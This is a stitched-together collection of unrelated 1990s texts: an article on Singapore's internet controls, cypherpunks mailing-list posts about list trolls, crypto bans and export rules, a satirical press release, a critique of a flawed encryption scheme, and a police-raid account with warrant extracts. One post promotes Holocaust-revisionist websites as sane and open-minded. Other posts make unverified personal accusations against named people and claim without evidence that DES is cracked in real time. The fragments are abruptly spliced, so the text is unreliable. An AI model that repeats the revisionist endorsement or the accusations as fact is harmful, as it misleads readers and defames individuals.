modernity and pluralism go hand in hand. Hence the recent
flurry of efforts by governments in the region to exert
control over the Internet and overturn what they see as the
American colonisation of cyberspace.
The effort is complicated by the undoubted commercial
potential ofthe Internet, and its future as a business tool.
Most countries would prefer to do without the smut and the
anti-government invective, but none wants to risk being left
out. Fidel Ramos, president ofthe Philippines,whose press is
freer than others in Asia, has his own home page, but so does
the military junta that runs Myanmar's media like an Orwellian
Ministry of Truth.
The dilemma is most acute for Singapore. More than any other
country in the region, it prides itself on being ahead of the
technological game. Indeed, its economic success relies on a
state-of-the-art infrastructure. By the end of the century the
government hopes to have created an "intelligent island", with
at least 95% of homes cabled for services like the Internet
and interactive television.
Already, the government has a big presence on the World Wide
WebHt even provides links to a Board for Online Graffiti ("the
only place in Singapore where graffiti are legal"). You can
make your choice of virtual lavatory wall on which to scribble
a message. More seriously, the World Chinese Business Network
hopes to harness the Internet to the legendary "guanxi" or
connections that drive overseas Chinese business. George Yeo,
Singapore's information minister, is fluent in cyberbabble.
"we will need a URL [universal resource locator] that is easy
to remember," he told a meeting of his colleagues from the
Association of South-East Asian Nations (ASEAN) on March 7th.
"we should also encourage hyperlinks to each other's web
But Singapore is also among the staunchest critics of
unfettered individualism, and of western attempts to foist its
political standards on Asia. Because its content remains
dominated by westerners, the Internet can be seen as part of
such an attempt. Every fanatic liberal and foulmouthed crank
can air his heresies and obscenities. So Mr Yeo also warned
his ASEAN colleagues that "the influx of objectionable
materials via the new electronic media, if left unchecked,
will undermine our values and traditions."
He was speaking the day after Singapore had introduced
"anti-pollution measures" to clean up the I nternet in
Singapore. The three local "providers", offering access to the
I nternet by a domestic telephone call, will be required to
filter out offensive material. "Cybercafes" providing
computers for customers to use the Internet will have to
install filter software such as "Net Nanny" or "Surf Watch".
But this is not just an antipornography drive like that seen
in many countries. Organisations posting political or
religious information on to the World Wide Web will need to
register with the broadcasting authority.
Technically, Singapore's effort to control the Internet will
be complicated. Mr Yeo suggested it was feasible because all
international telephone traffic reaches Singapore through one
network, operated by Singapore Telecom. So the authorities are
able to monitor anything being sent to Internet servers (who
distribute material) in Singapore. Singaporeans could still
dial abroad and get access to the uncensored Net. But that
would be expensive -- prohibitively so for most people,
especially if they wanted to download a pin-up, which can be
frustratingly time-consuming.
Mr Yeo stressed that Singapore did not intend to "stifle
discussion". The only obligation on those engaging in
political debate was to take a "certain responsibility and
accountability" for their views. It was not clear how these
requirements would apply to the Singaporean who responded to
the speech by calling the minister a "pea-brained imbecile" on
an Internet discussion group.
Singapore's house-cleaning effort will be watched closely by
other governments in the region. Of Singapore's 3m people,
100,000 already have Internet accounts, twice as many as in
China (population 1.2 billion). Nevertheless, China has
already gone a step further than Singapore, requiring all
Internet users as well as providers to register. It too is
looking at how to put a cordon sanitaire around the Internet.
Like Myanmar and Vietnam, it is particularly concerned about
the campaigning activities in cyberspace of exiled dissidents.
Vietnam is seeking prevention rather than cure. The
state-owned Internet provider, Netnam, does not as yet give
subscribers access to the World Wide Web, just to e-mail
Other ASEAN countries have so far preferred to be seen as
Internet-friendly. Malaysia's deputy prime minister, Anwar
Ibrahim, recently opened an exhibition about the Internet in
Kuala Lumpur with a warning against censorship. "Let us not
forget", he said, "that an informed citizenry is also a
responsible citizenry."
Similarly in Indonesia and Thailand, the Internet is largely
unregulated. An Indonesian magazine, Tempo, banned in 1994 for
upsetting the government, has just reappeared "on-line", which
even the censors admit is perfectly legal. In the much freer
intellectual climate of Thailand, the concern has been as much
about sex as about politics. An Internet campaign has urged a
boycott of Thai goods because of the prevalence of child
prostitution in the country. And a photograph has been posted
on the Internet purportedly showing a senior politician
engaged in sexual congress with another man's wife.
As the Internet gathers pace, so too will its impact on the
political scene. InJanuary an article in Singapore's
obsequiously pro-government Straits Times asked whether
Singapore would "change the Internet", or the other way round.
"A little of both," it concluded. But as the Internet
free-for-all becomes more readily available to the population
at large, other, more decorous, media may find it hard to
ignore the challenge. The Straits Times itself may be among
the first to feel the change.

So that y'all can see what the fuss is about, try the following sites :
Theres a wealth of eye opening information there, not only about the
holocaust, but about freedom of speech, censorship, civil librerties,
hate groups, nazi hunters etc. etc.  The sites are noticeably empty
of "hate speech," and are in no way "denying the holocaust," but are
simply adopting a scientific approach to documenting the events of the
holocaust, seperating fact from fiction.
I was surprised - the authors of these sites come across as very sane
and open-minded, not the foaming at the mouth bigoted types that others
lead us to believe.
Anyone who seriously calls him(her)self open-minded should give these
sites a go - they certainly got me thinking.
The recent actions of the French and German governments make me feel
like I'm living in the middle ages.  I am truly disgusted at the
actions of such close minded people who have obviously not looked

Ohh pleeez!!, give YOUR ravings a rest
Next you'll be raving about soap and lampshades made out of Jews.
The story about the Danish King and the Yellow star is a famous wartime
lie by the US.  When Germany invaded Denmark and Norway, the king of
Norway fled to London to continue resistance.  The king of Denmark
surrendered.  Many in the US thought the Danish king was a coward.
During the war the story  about the yellow star was made up to make the
king look better.

Denmark's resistance to Nazis 'is a myth'
By John Keegan, Defence Editor
DANISH resistance to German occupation during the Second World War is largely
a myth, according to a leading historian.
The civilian population was not involved in resistance and the celebrated
rescue of Denmark's Jews from Nazi deportation was facilitated by the German
occupiers themselves. Those caught assisting the Jews' escape were either not
punished or else given nominal prison sentences.
These astonishing claims were made by Prof Henning Poulsen, of Aarhus
University, at a conference on "The Second World War as Myth and History"
held in the Swedish Houses of Parliament. The conference was opened by the
Swedish foreign minister, Lena Hjelm-Wallen, and closed by the speaker of
the Swedish parliament, Birgitta Dahl.
Prof Poulsen insisted that his views were not controversial, a view supported
by another Danish professor. The official story of the resistance was, he
said, no longer accepted by most young Danes, who found it exaggerated and
boring. He reminded his audience of fellow historians from Norway, Sweden,
Finland, Iceland, Russia, Canada and Germany that Denmark capitulated on the
day of the German invasion, May 9, 1940, and was not treated by Germany as a
conquered nation.
The elected government remained in office and German officials belonging to the
administration in Copenhagen made visits to Danish ministers, not vice versa.
Danish political parties were allowed to function normally and to maintain
democratic debate. The only limitation on their activities was that criticism
of Germany was not permitted.
The occupation remained a benign one.
Werner Best, the SS officer representing the German foreign office, did not
wear his black uniform and was not allowed by Himmler to use his high SS rank
title. The foreign office was the agency chosen by Hitler to represent German
power in Denmark during the occupation.
After August 1943, when there were riots in Copenhagen following misbehaviour
by German troops, conditions worsened, said Prof Poulsen.
The Germans dissolved the elected government and imposed direct administration.
Nevertheless, he said, the occupation remained a benign one.
Danish civilian rations were more generous than those in Germany and when
German police were called on to put down demonstrations in Danish cities they
did so under the regulations governing police response to civil disorder in
In his most sensational revelation, he said that the only concentration camp
set up by the Germans on Danish soil, at Froesley, never held more than 4,000
inmates, 2,000 fewer than it was designed to contain.
Denmark "won a war in which it had not taken part"
It was administered by the Danish prison service and was the only concentration
camp in the Nazi system where the German guards asked for the same food as the
prisoners. It was ironic, Prof Poulsen said, that Denmark was included among
the victor nations in 1945 by Britain, America and the Soviet Union. It had
thus "won a war in which it had not taken part".
Prof Poulsen conceded that there had been resistance in Denmark, but of a
military, not civilian, character.
By that he appeared to mean that sabotage operations against the Germans were
the acts of unrepresentative groups, working in co-operation with the British
Special Operations Executive, and did not represent the attitude of the
majority of the population.
Prof Poulsen's paper is likely to provoke argument, particularly in Britain,
America and Israel, where the Danish success in arranging the escape of 95 per
cent of the country's 7,000 Jews to neutral Sweden in September, 1943, is
hailed as an example of what might have been achieved elsewhere had domestic
populations shown the same determination.
He suggested that the escape succeeded because the Germans did not try to
prevent it and because the worst penalty visited on those fishermen who were
caught after smuggling Jews abroad was three months' imprisonment.

@_subject: detweiling 
I've been studying "detweiling" in old archives
as this issue is raised here every so often.
imho the lesson of detweiler has nothing to do with
detweiler, but in fact more to do with his
targets. effective "detweiling" would be impossible if it
were not for the large egos of his quarry. he
selects his targets carefully based on the size
of their egos, presses their obvious
buttons, and stands back to watch
the fireworks ensue. the larger the ego, the
more easy it is to do this. (i.e. larger
fireworks/provocation ratio).
detweiler took a lot of pride in how much reaction
he could get with just a few posts or barbs. he is not
really apparently responsible for ever actually
mailbombing the cpunk list from what I can tell.
he believed he was perfecting the art of playing
with people's egos. a sort of depraved cyberspatial
psychology experiment.
the amusing thing about "detweiling" is the way
that it is something like a bad, self-perpetuating
virus among those with big egos. detweiler took
great glee in starting the virus wherein these people with big egos blame all their obvious personal problems on him (i.e. atrocious lack of interpersonal skills). since the virus propagates
not because of any action on his part, but because
of the inherent psychology of those with big egos, it continues on this list even though there seems to be no evidence that Detweiler
has had anything to do with this list for
perhaps over a year.
the cypherpunks is a rabid breeding ground for
this detweiler virus, because of the vast array
of throbbing egos. the flamewars are routine
because of the immature psychology of many posters,
esp. the more "prominent" ones. even anonymous
or pseudonymous posters defend themselves because
of their large egos, and those with big egos feel
they have to defend themselves against anonymous
or pseudonymous accusations, or take intermittent
jabs at whatever hapless pseudonym-of-the-week is thought to be detweiler.
imho from what I have seen (which is admittedly
not everything, as the detweiler stuff is rather
endless), detweiler is not really destructive in himself.
but he is an amazing catalyst to those that already
have destructive tendencies within themselves,
and he tweaks them into erupting. in a sense it
is almost a public service in helping people with
big egos temporarily relieve their "painful
but I see no sign that he has been anywhere near
the list for a long, long time, and I think all
the ranting and scapegoating of him is quite
strong evidence of all the big egos and small minds
that litter this list.
there is nothing new about detweiler's approach.
there was a classic greek who was put to death
for the same reason: not provoking people by calling
them names, so much as asking them questions that
embarrassly exposed all their ego problems.
his name was called "socrates" and he was put to
death for refining his art beyond that which was
tolerated by a power structure largely populated
by those with the ego problems (power structures
are always dominated by these types, it is like
flies and dead meat, or moths and flames).
the joke of course may be that detweiler could have
been dead for a long time, and people here would
still be blaming him for their problems. perhaps
we have a new convenient substitute for Satan in
the cyberspace age. "the detweiling made me do it."
(hee, hee). "projection" was identified by freud
in another century as a basic device of the ego,
a pity that few in our modern era are aware-- or
perhaps it is not such a pity from detweiler's
perspective. (p.s. I imagine quite a few people will accuse "me" of
being detweiler. I assure you my amusement will at least
exceed or match that which detweiler ever obtained.)

On the Encryption note, and I swear not along the lines of the 'DOJ' and 'FBI Snooping' Big-Brother events, I heard another story recently.
# begin story
A person working on the MBONE project did an unannounced experiment
across the internet using Triple-DES for MBONE, and the very next day, 'ATF' agents knocked on his door and warned him against exporting munitions.  The experimentor was shaken by the fact that agents approached him so quickly after the experiment.
# end story
Extrapolations of fact:
   1.   Internet traffic is monitored.
   2.   The ability to snoop for encrypted traffic is present
   3.   The ability to identify encryption levels is present
        (How else can they differentiate DES-1 from DES-3?)
   4.   The ability to crack DES-1 in near real-time mode is present.
        (See above).
   5.   If above=true, then Feds dropping the Zimmerman PGP case probably
        also points to it also being crackable in a similar manner.

Q: Who is Dimitri Vulis? A: Dimitri is an XSoviet immigrant who is enrolled (or used to be enrolled) in CUNY, and who is a computer professional involved i.a. in unicode matters. The realspace Dimitri is a polite person and a devoted family head.  It's cyberspace image is not nearly as nice, unfortunately. He harasses people all over the net with the most offensive sorts of messages, and uses dirty tricks to retaliate to the people who do get offended. Among his accomplished feats is a series of articles about cat-eating dogs posted to rec.pets.cats (which caused a wave of complaints and made him lost his CUNY account) ; a series of porno binaries with obscene comments about his opponents posted to math-related newsgroups (he lost another academic account, at fordham.edu, after this scandal); and a series of racist articles denigrating all aspects of romanian life and culture which used to haunt the romanian newsgroup for years. Of course most of his net.bile is spilled over his fellow XSoviets, particularly of Jewish origin (such as Michael Verbitsky, Boris Veytsman, Vlad Rutenberg or myself, as well as all Brighton Beach together); and a lot of stuff comes out from his alleged aliases in bwalk.dm.com, aol.com and fly.harvard.edu. Some of these aliases match the names of his opponents, as I already mentioned.  Sometimes not only the names but also addresses match (although paths don't). Dimitri Vulis also advertises the capabilities of his site for forging and cancelling articles. Sometimes he shrewdly comments articles of his own saying : "This article is most certainly forged, after all I spent a lot of time teaching you how to forge... but I nevertheless like this article's content".

Dimitri Vulis:
Contrib. post:
 whose obnoxious, derivative and not-very-funny Soviet emigre jokes from Brighton Beach were a weekly feature about a year ago on rec.humor . He ignored completely any requests to stop. Eventually he started getting flamed in demotic Russian-quite fun for those of us who could read it.
- Dan "And to think he felt it important enough to waste his two hours of daily connect time on it" Case
 so what _is_ the deal with vulis?  is "russian emigre" a codeword for "jew", or for "russian emigre", or for something else?  (if i recall correctly, minor and now somewhat reformed net.loon mikhail zeleny claimed rather convincingly that vulis's posts contained certain tell-tale phrases which are highly un-idiomatic in english ("dandruff-covered" was one of them, i think) which were dead giveaways of classic pathological russian anti-semitism.)  so is vulis russian?  an emigre?  a jew in some sense?  self-hating?  maybe a self-hating russian jewish emigre who hates only the jewish half of themself?  or maybe they hate the russian half too?  are they now or have they ever been, while residing in america, on the payroll of any branch of any soviet or russian government?  did they stop posting russian emigre jokes when the paychecks stopped coming?  are they a zhirinovsky supporter now?  the most recent messages posted by vulis
that i have seen seem designed mainly to convince people that both zhirinovsky and valery fabrikant are (russian?) jews.  (it's very likely true in fabrikant's case, at least.)  maybe vulis is a self-hating supporter of zhirinovsky and fabrikant?
Posts on soc.culture.soviet, and is apparently something of an institution there; likes to stir things up, and to flame and/or troll people. I'm not up on which sides are good and/or bad on s.c.s, which among other things seems to have been ravaged by Serdar Argic for a long time as well, driving away many
of the gentler posters. Is currently engaged in flamewar with Peter V. Vorobieff there. Posts from dlv at CUNYVMS1.GC.CUNY.EDU (Dimitri Vulis, CUNY GC Math).

@_subject: So how does the crypto crackdown go? 
Not at all questionable. A ban on crypto would follow the current trend in regulating technology. Consider the case of Bernie S. who is in jail for possessing electronic parts that could be used for telco fraud. Any government action towards banning crypto will include possession
of crypto as a crime. The "cat's out of the bag" argument is ineffective as well as the governments just don't care. They'll just say in effect: "It's illegal. Destroy it if you got it." Now it's doubtful if enforcement would make unprovoked searches and arrest people solely for possession of crypto. And it is also unlikely that DA's (except perhaps the most bored) would follow up on "My neighbor is using crypto" tips. But it is not uncommon for prosecutors to heap additional charges on criminals (alleged) such as the case in robbery: 1 count robbery, 1 count using a gun in robbery. or perhaps 1 count tax evasion, 1 count using crypto to commit tax evasion. While the former charge may end up being unproven the later often sticks.
Hmmm. Hackers built the ubiquitous CryptoFS for Linux, no? And the nascent S/WAN too. I don't see a distinction between popular and subculture crypto. The two invariably mix. A program may have it's origins in the subculture but it will often meet the needs of the popular culture as well and be adopted, accepted, and so on. Consider PGP and such add-ons as Brainless-PGP, WinPGP, and the various auto PGP tools.
It seems to me that banning distribution would just be too generous. What is distribution? Are time share accounts distribution? I created it but many can use it but the actual bits (well are there actual bits?) never left my single computer. But the nature of "distribution" is to move something from one person to another. Now nothing really moved but a few electrons. But multiple people did use it. Book 'em. Distribution is an archaic term here and the regulations will involve controlling what software may be run on personal computers.
The stated goal is a posture designed to sound reasonable. Only time will tell if the actual goal is the regulation of computer uses as I suspect.
The security establishment fears crypto. Fears loss of control. I suspect that with Clinton back in the White House (was there a choice?) we will enter a period where the Clipper chip seemed like a good idea. In comparison. Unless some fundamental changes occur to the Security, Intelligence and Law Enforcement agencies  (a new acronym? SILE? Pronounced with a long E of course ) we will see more
business as usual and some completely draconian steps taken against strong encryption. The only recourse is to take an active role now. We must go on the offensive and :
1) Deploy S/WAN
2) Write more strong ubiquitous crypto
3) Attack the SILE agencies directly by challenging their purpose, gutting their budgets, exposing their falacies (umm is that almost freudian or what), flooding international communications with strong crypto messages (content need not apply), and of course ridiculing their every effort.
4) Finding allies in the legal community and educating fence sitters, critical judges, legislators, and so on.
Now is the time to act.

@_subject: Censorship on cypherpunks?, from The Netly News 
This is true. On the other hand, privately-owned public forums do exist. Chartered FreeNets, for example, and the facilities of private Universities like Carnegie Mellon. There may be a fine line somewhere, but I don't believe we need to draw it, because what is at issue here is the character of the moderator, not the legality of his action.
We're just spinning wheels here talking in the abstract. I actually agree with Vulis's reasoning -- you need to look at the facts of the case in order to determine whether an act of censorship, or heckler control, or editing, or whatever, was proper. But apply that reasoning to Vulis's case, and you conclude that he's completely in the wrong, by any standard.
Clearly. And if your statement of the facts is correct, then you would be right in exercising your right. If there is more to the story, though, or if your story is wrong... well, then you still have the right to be a jerk, but you are, nonetheless, a jerk. In the cypherpunks case, though, the only jerk here is Vulis. It is worthless and IMO dangerous to prove that by arguing from first principles. The "Freedom Knight" kooks are correct in pointing out that every "philosophical" argument you've made can be and has been misused. Try a little empirical evidence; there is plenty to go around. "Truth is far more fragile than fiction... reason alone cannot protect it." Proof is syntactic; truth is semantic.
It differs in one small but important way: it all happens in the digital domain, so it can all be archived in its entirety. It is more difficult to lie about what happens online (but not impossible, as Vulis and company demonstrate). In an online forum, you have access to *all* the empirical evidence. There's no reason to rely on pure reason.
So enough already with the hypothetical cases. You've got a specific case of your own that, oddly, you still haven't mentioned.

@_subject: Media seekers, reputation and banishment 
Seems like the Freedom-Knights are seeking a little publicity? Perhaps an interview in Wired?
A column in the WaPo? A spot on  Are these the same folks who gather around
at fires and crime scenes trying to get into the camera? "Hi Mom! We're on CP now! Look
at me!"
I find the aga/hayes posts amusing. It's amazing at how people have refined their skills at rhetoric,
debate and insults. The poisoned pen gets much practice.
So the aga/hayes posts attempt to extract reputation from Gilmore and Declan. It is interesting
to see how attacts on reputation are futile as reputation is built up (or spent) gradually. Pointing
a finger and shouting "You are stoopid!" is obviously ineffective at damaging any credibility other
than that of the person holding the finger. Remove the insults and aga and Hayes offer little in the way of compelling arguements.
Maybe Gilmore made a mistake in removing DV from CP. Perhaps it is a contradiction of some ideal
of open dialog and free speech. DV seems to have unlimitted energy for insults, rants, and blather,
so removing him directly (with the actual effect of simply making it less convienent for him or her to post) was a practical move not a philosophical move. A practical move to assert the will of the A community offers few punishments for asocial behavior. Killfiles are partly effective. But the strongest
punishment is banishment. The issue is not "is banishing unruly louts from the discussion censorship" as censorship is a state
of being threatened with loss of liberty for what one says. The issue is "do we individually banish
asocial louts or collectively?" and of course how do we decide who to banish. All of this  is certainly easier when done individually yet it is often prudent and effective to have someone take
action when they are in a position to do be effective. Gilmore acted properly in my opinion. And DV
remains in my killfile.

The SPA allegedly send sameer at c2.net a letter, demanding, among other things,
that he "agree to implement monitoring procedures to prevent similar acts
of copyright infringement and report those procedures to SPA."  Under federal
law (Electronic Communications Privacy Act) it is illegal to monitor users'
actions unless there is a specific contract between the service provider to
allow such monitoring, or a court of law has issued a valid search warrant.
If the SPA did in fact send such a letter, what they are doing is illegal.
They have alleged that a copyright violation has occured.  If that were true
and they had evidence to support that claim, then under federal law, they
could have asked a judge to issue a search warrant to seize the infringing
material and stop its distrubution, and/or they could have subpoenaed
information about the alleged infringers from C2NET.  But, because they did
not have any evidence of a copyright violation, they could not get a search
warrant.  Consequently, they have attempted an illegal search, in violation
of the ECPA.  They threatened the CEO of C2NET with legal action if he did
not assist them with their unlawful scheme.  He rightfully refused, and
now they are carrying out their threatened harassment against him.
The lawsuit filed by SPA mentions no specific cases of copyright
infringement, because, in all likelihood, there never were any.  The SPA
is merely going on a fishing expedition.  The SPA should not be suing
Sameer - Sameer and his users should be suing the SPA.

Another Cypherpunks exclusive!
Bowing to US pressure, the Japanese Ministry of International Trade and Industry (MITI) has quietly made changes to Japanese crypto export regulations.
In the past, export of crypto products from Japan was unregulated. The exporter had to file a pro-forma export declaration with MITI. The new regulations, imposed in recent weeks without public announcement, require the exporter to state the ultimate recipient of the crypto product. MITI then conducts a lengthy approval process that can take many weeks.
It is widely assumed that the US used the thread of trade sanctions to bring about this 180 degree turn in the attitude of the Japanese government.
The new regulations apply to exports from Japan to all countries, including the US.

SPA Files Morality Suits Against ISPs and End Users
Internet Decency Campaign Launched (Oct.10, 1996 --Washington, D.C.) -- The Societal Policing Association (SPA) announced today that it has filed five civil lawsuits for morality
violations occurring on the Internet. Three of the lawsuits were filed against Internet service providers (ISPs), and the remaining two were filed against individual end users. Additionally, SPA launched its Internet
Decency Campaign, which includes education and enforcement components, in an effort to educate and work cooperatively with ISPs regarding morality
and decency violations. ISPs who immediately enroll their employee-units in
decency reeducation programs and who agree to participate in SPA's program
to stamp out illegal thoughts will receive immunity from SPA lawsuits and
will receive a pro rata share of the collected loot from other ISPs sued by
the SPA. ISP lawsuits were filed on Oct. 7 and 8 against Community ConneXion of Oakland, Calif.; GeoCities of Beverly Hills, Calif.; and Tripod Inc. of Williamstown, Mass. The SPA members named as plaintiffs in all three suits were the
Christian Coalition, the Anti-Defamation League of B'nai Brith and the
Million Aryan March. In each case, SPA first  contacted the ISP and
requested that the offensive thoughts  be purged, but the ISPs cited the
notoriously Communistic "First Amendment" and the anti-Christian
"Electronic and Communications Privacy Act" and refused to cooperate. "These lawsuits send a clear signal to ISPs and end users that neither
so-called "free thinking" nor failure to pay our protection fee will be
tolerated. The Internet does not provide a safe haven for these types of activities," said Emmanuel
Goldstein, SPA Reichsfuhrer. "Our intentions are to work cooperatively with ISPs. A key element of the IAPC is the ISP Political  Reeducation Program devoted to alerting ISPs to their
potential state of sin and providing them with the tools and moral guidance to save themselves," said Winston Smith, SPA's Reeducation Coordinator. --Keyser Soze, Political Reporter

was in either v2.01 or v2.02.  At the time, I thought about writing a patch
to fix the problem, but decided there was really little purpose in trying
to talk http to sendmail, so I didn't bother.
In any event, the blocking is in netscape itself and not in the proxy
server, so you could just telnet to your proxy on port 80, and issue the
commands to connect to whereever you want.
You could also look for a program called webex, it's a cgi script which
generates html forms on the fly, allowing you to read your mail in your
web browser.
I feel I should point out that accessing your mail in an unencrypted
fashion, through a possibly untrusted proxy server is quite insecure and not generally advisable.

Not quite.  What the program actually does is the first time you send a
message, it generates an initial key and sends the key - in plaintext -
to the recipient.  Then the first message is encrypted with this key.
So the system initially has absolutely no security at all.  The second message sent is encrypted with a hash of the first message as
a key.  The third message is encrypted using a hash of the second message,
and so forth.  So each time you send a new message, you in effect send
a new key, encrypted with the old key.  Their theory is that if the
eavesdropper misses a message, then he loses the key, and can't decrypt
the messages anymore.
Of course, if the intended recipient loses a message then he loses the key
for subsequent messages too.  Thus we have a nice little denial-of-service
attack.  They prevent this via a "emeregency resynchronization" procedure
(which they seem quite proud of, and their web pages congratulate
themselves repeatedy on the purported cleverness of this).  Of course, this
"resnchronization" is based upon a pre-arranged key, which the eavesdropper
should already have, if he's been decrypting their mail.  Even better,
the attacker can synchronize with one or both parties, performing a
man-in-the-middle attack and/or spoofing them.
So basically the system will stand up to a passive sniffing attack only if
the eavesdropper is clumsy and loses messages, and doesn't stand up to a denial-of-service or man-in-the-middle attack at all.  And I haven't even
considered implementation bugs yet.

@_subject: Montgolfiering, the Hot Air Balloon of Cryptography 
Fie on the small minds that cackle at my brilliance! As a Mensa member and
founder of the Society for Superintelligent Former NSA Employees, I chortle
at the baseness of callow criticisms by those doubters and dilletantous
denigrators of virtual one-time pads and PRNGs (perfect random number
Montgolfiering. What is it, you ask? It is demonstrably a new paradigm in
the evolution of homo sapiens (Parry Messger excepted) toward Shannon's
dream of a one-time pad needing only a single, easily memorizable number as
a seed. I have heard only silence when I challenged the so-called
superbrains of this latargial list to try to determine which number I am
using as the seed of my system. If you are such great smarty pants, far
smarter than my colleagues at the NSA and at Mauchly-Wood, why can you not
then determine this number? Could it be because I have outsmarted you?
Could it be because I understand the Sufi secrets of picking random numbers
truly randomly? I submit this to you: 8  31  26  3  19. Now, oh great ones,
tell me, what is the next number in this sequence?
Ha, you cannot predict this next number, can you, oh gibbering greatnesses?
Ths proves that my perfect random number genarator (PRNG, for those of you
too stupid to remember) cannot be broken. Q.E.D.
I question the issue of Parry Messger's objectivity in assessing the
brilliance of my importations and acidulous assertations. I question
whether Parry may have a peculiarly pecuniary interest in these affairs?
Does Parry have an insider, or other position, or interest in one or more
of the RSA interest? If, this explains his fantastical faith in the core of
this so-called "RSA" system, which I proved to my colleagues at NSA could
not possibly be valid. Why, you ask? Because it contains no virtual seed,
and that which has no seed cannot grow. Q.E.D.--it has been debunked.
Entropy, you quibble? Ha! What is entropy but thermodynamics? And what is
the topic of thermodynamics, you small-minded ensemble (Gibbs) people who
never worked for the NSA may ask? Thermodynamics is about hot air. Hot air
is in balloons. Balloons were pioneered by the Montgolfiers. Thus we come
full circle (can you understand this, you mental midgets?).  Q.E.D.--it has
been demystified.
Montgolfiering = a new virtual one time pad based on hot air. Eureka! I
have found it.
P Information = P * log_base_infinity P
As my colleague Dr. Bronner told me on my last balloon trip to his
institute in Escondido, "NATURAL! NATURAL! NATURAL! YOU AND THE PLANET -
CLEAN AND HEALTHY! PURE AND NATURAL CRYPTO COMES FROM WITHIN THE AGENCY."
I pity your eupatrid minds for not accepting the wisdom of the Virtual
Montgolfiering System (which I have dubbed "VMS"). I guess unintelligent
creatures such as petty selves are too much like Parry Messger! Your
mendacious misrepresentations of my brilliance are wounding me deeply--NOT!
Only Dr. Bronner and Dr. Vulis seem capable of understanding the immmense
mental breakthrough my IQ measured at 207 has provided the world.
I laugh at your sanctimonious snivelings, your bombastic bombardings, and
your fatuous flatulations.
Remember, they laughed at Galileo. They laughed at Bozo. They laughed at
Von Daniken. They laughed at Ludwig Plutonium! All of those who leaped at

Well, not quite the same situation. IIRC, the Iranian aircraft refused to respond to challenges. The captain of the Vincennes added that to the info that the Aegis system was giving him, and decided the aircraft was a threat. Turn a key, push a button, and so long, Airbus. (There was also some discussion about whether the Airbus had military IFF gear aboard that may have led the captain to think it was a warplane, but I don't remember if anything came of it.)
The Iranian Airbus was also flying out of what was essentially "hostile" airspace. Despite the massive number of "terrorists" who live here -- at least according to the popular press -- I don't think the Navy has taken the step of declaring CONUS to be a hostile territory. :-)

Tim is not productive. He *was* productive, but not anymore; his wealth
might be productive in some indirect way, but it it certainly severable
from him. He demands to be left alone by certain socio-economic
apparatuses (socialized welfare) but is quite content to rely on the
existence of other such apparatuses (investment entities, banks). Whether
*that* is "hypocritical" doesn't interest me; I merely pointed out that he
is constantly and resentfully whining about his own "rights" and about
others' lack thereof--in that regard, he's of a kind with the people he is
forever griping about.
   This is a silly statement of the kind often made by people who have no
solid grasp of history or social organization: most societies that
radically differ from our own in their ways of maintaining/supervising
their members (successful or not) have apparatuses so invasive and
arbitrary that, in comparison, the IRS and assorted other bureaucracies
look pretty benign.

Forwarded from another mailing list...
Hows it going there??? Well, let me tell you of the recent drama.
Feel free to tell anyone you want. At 0700 this morning the santa
rosa pd, rohnert park pd, and the sonoma sherriffs (gang task
force) raided Robert and my house simultaneously. It was very
depressing. A full swat team with their mp-5's and riot shot-guns
compleate with their kevlar helmets, black bdu-s and  riot shields
put my brother, me, my uncle (who is a retired Philippine Marine
officer and saw combat duty during his service), and my old
grandfather, in hand-cuffs face down. Let me tell you that it is a
very scary feeling to have a mp-5 with the safty off pointed at
your back when you are truly innocent. They served me a search
warrant and confiscated my brothers telescopic baton, my black
ruck-sack which included my black bdu's and my tabi that I use for
Bujinkan and a photo album of mine with some of the gun pictures in
it. It's funny because in that same albulm I have my Guardian Angel
pictures in there plus some pictures of when I was at Airborne
school in ft. Benning.
I told them the whole story and I even had to explain my bdu's that
I use for Bujinkan. The investigator told me 'as if he was a expert
in the martial arts' that dosen't your dojo use gi's and have
ranking systems. I had to explain that Bujinkan is not a normal
style that he was use to.  In fact, One of the investigatiors who I
will not say, treated me as if I was a dumb unintelligent nit.
Trying to make me say things that were not true. I even had to
explain about a little ninja dash ornament that Jason and I have in
mine and his car. I told them about having an attorney present but
he just told me that if i had nothing to hide to tell him the
information that I knew. So I told them everything. Apparently, I
guess you now have to prove your innocence instead of being
innocent untill proven guilty.
I don't know how Robert faired because I haven't been able to talk
to him yet. But I'll keep you up to date on what happens.
Your Bujinkan Warrior,

The following night in the dojo I also was able to get Robert's
side of things. Pretty much the same story: They cuffed Robert and
told his father and stepmother to get out, at which point Robert's
62-year- old stepmother sort of "lost it" and snapped back to her
girlhood in France, when the Nazi soldiers came to her village and
behaved the same way. She actually attacked one of these modern
ones and knocked the fine German-made HK MP5 submachine gun out of
his hands.
No firearms were found at either residence, and no one was taken
into custody. They tried to question Robert, but he informed them
that they were welcome to search for the items specified on the
warrant, but that if they found nothing and wished to question him
about anything else, they would have to arrest him and take him to
the station, whereupon he would answer questions only in the
presence of an attorney.
What, specifically, were they looking for? Following are ex- tracts
from the search warrant:

                          COUNTY OF SONOMA

        preventing its discovery
  X     is evidence which tends to show that a felony has been committed
        or a particular person has committed a felony
        you are therefore COMMANDED TO SEARCH the premises located at
        and described as: (followed by addresses and descriptions of
        Rex's & Robert'sresidences and vehicles) and the persons of
        (followed by Rex's & Robert's names and physical descriptions;
        and)
        3. Subject  the person depicted in the attached photographs,
should he be present at either location; for the following property:
        1. AK-47 variant, 7.62x39 with Choate handguards and thumb hole
stock with thirty round magazine. This weapon is defined as an assault
weapon by 12276(a)(1) PC, which covers the AK-47 and all of its variants;
        2. Chicom SKS, 7.62x39 with folding stock and thirty round de-
tachable magazine. This weapon is defined as an assault weapon by 12276
(a)(11) PC, when it has a detachable magazine;
        3. Any miscellaneous gun pieces, ammunition, gun cleaning items
or kits, holsters, ammunition belts, original box packaging, targets,
expended pieces of lead, photographs of firearms or any paper work show-
ing the purchase, storage, disposition or dominion or control over any
guns, ammunition or any of the above items;
        4. Articles of personal property tending to establish the ident-
ity of persons in control of any premises, storage areas or containers
being searched, such as utility company receipts, rent receipts, charge
card receipts, tax receipts, airplane tickets and other receipts, checks,
deposit slips, savings account passbooks, passports, drivers licenses,
vehicle registrations/titles, land titles, escrow papers, legal docu-
ments, Social Security cards, Food Stamps, Medi-Cal cards, insurance
bills and/or policies, medical records, prescriptions and prescription
bottles, doctor bills, hospital bills, cancelled mail, addressed envel-
opes, photographs, weapons with serial numbers, keys and safes;
        5. To search and/or seize any and all computer equipment, in-
cluding any and all storage media, either hardware or software, located
within said residence for evidence relating to this crime;
        6. Any and all electronic day planners located within said res-
idence for any and all evidence pertaining to this crime;
        You are authorized to defeat any and all security and/or pass-
words; and to SEIZE it if found and bring it forthwith before me, or
